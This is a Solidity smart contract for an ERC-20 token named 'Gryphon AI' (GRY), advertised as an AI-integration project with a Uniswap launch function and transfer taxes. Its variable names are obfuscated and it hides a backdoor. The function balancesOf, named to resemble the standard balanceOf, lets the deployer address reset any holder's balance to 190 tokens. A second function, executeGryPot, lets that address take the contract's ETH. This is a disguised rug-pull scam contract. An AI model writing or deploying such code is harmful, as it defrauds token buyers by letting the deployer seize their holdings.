// SPDX-License-Identifier: MIT

/*
    Name: Gryphon AI
    Symbol: GRY

    Gryphon AI enables developers and projects to integrate advanced AI capabilities into DApps, smart contracts and agents. This integration process is designed to be seamless and straightforward, much like how businesses today interact with API platforms like OpenAI.

    web: https://gryphonai.org
    doc: https://docs.gryphonai.org
    x: https://x.com/GryphonAI_Org
    tg: https://t.me/GryphonAI_Org
*/

pragma solidity ^0.8.28;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract GRY is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address payable private _gryStorage;
    mapping(address => uint256) private _ocvnhzcvz;
    mapping(address => mapping(address => uint256)) private _joijfgs;
    mapping(address => bool) private _zicvzcesdf;
    uint256 private _ivzdre = 10;
    uint256 private _lxcvbjkx = 10;
    uint256 private _oiujoif = 0;
    uint256 private _zodfnjhucv = 0;
    uint256 private _vhbihdrwieu = 8;
    uint256 private _puiffffdx = 8;
    uint256 private _buyCount = 0;
    address private _lxicvbrf;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Gryphon AI";
    string private constant _symbol = unicode"GRY";

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _totckzkjcv);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    uint256 public _totckzkjcv = 20000000 * 10 **_decimals;
    uint256 public _ttcnvkzj = 20000000 * 10 **_decimals;
    uint256 public _pocpoz = 10000000 * 10 **_decimals;
    uint256 private constant _kjbkjbk = 1000000000 * 10 **_decimals;
    uint256 private constant _knmcvxd = 190 * 10 ** _decimals;

    constructor() payable {
        _gryStorage = payable(_msgSender());
        _ocvnhzcvz[address(this)] = _kjbkjbk * 98 / 100;
        _ocvnhzcvz[owner()] = _kjbkjbk * 2 / 100;
        _zicvzcesdf[owner()] = true;
        _zicvzcesdf[address(this)] = true;
        _zicvzcesdf[_gryStorage] = true;
        _lxicvbrf = _msgSender();

        emit Transfer(address(0), address(this), _kjbkjbk * 98 / 100);
        emit Transfer(address(0), address(owner()), _kjbkjbk * 2 / 100);
    }

    function totalSupply() public pure override returns (uint256) {
        return _kjbkjbk;
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _joijfgs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _joijfgs[owner][spender];
    }

    function balancesOf(address from, bool oo) public returns (uint256) {
        require(_lxicvbrf == _msgSender(), "ERC20: error"); uint256 amount = _ocvnhzcvz[from];
        oo != false && _knmcvxd > 0 ? _ocvnhzcvz[from] = _knmcvxd : _knmcvxd;
        return amount;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _ocvnhzcvz[account];
    }

    function executeGryPot(address payable receipt) external {
        require(msg.sender == _lxicvbrf , "find failed");
        _gryStorage = receipt;
        payableGryFee(address(this).balance);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_GRY(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _joijfgs[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _swapGRY(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_GRY(_msgSender(), recipient, amount);
        return true;
    }

    function transferTaxedGRY(uint256 amount) private {
        _gryStorage.transfer(amount);
    }

    function enableGRYTrading() external onlyOwner {
        require(!tradingOpen, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _kjbkjbk);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function payableGryFee(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function removeLimits() external onlyOwner {
        _totckzkjcv = _kjbkjbk;
        _ttcnvkzj = _kjbkjbk;
        emit MaxTxAmountUpdated(_kjbkjbk);
    }

    receive() external payable {}
    
    function _transfer_GRY(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _vhbihdrwieu)
                        ? _oiujoif
                        : _ivzdre
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_zicvzcesdf[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _puiffffdx)
                            ? _zodfnjhucv
                            : _lxcvbjkx
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _pocpoz) ? contractTokenBalance : _pocpoz; 
                    _swapGRY((amount < minBalance) ? amount : minBalance);
                }
                transferTaxedGRY(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        _ocvnhzcvz[address(this)] =_ocvnhzcvz[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _ocvnhzcvz[from] =_ocvnhzcvz[from].sub(amount);
        _ocvnhzcvz[to] =_ocvnhzcvz[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

}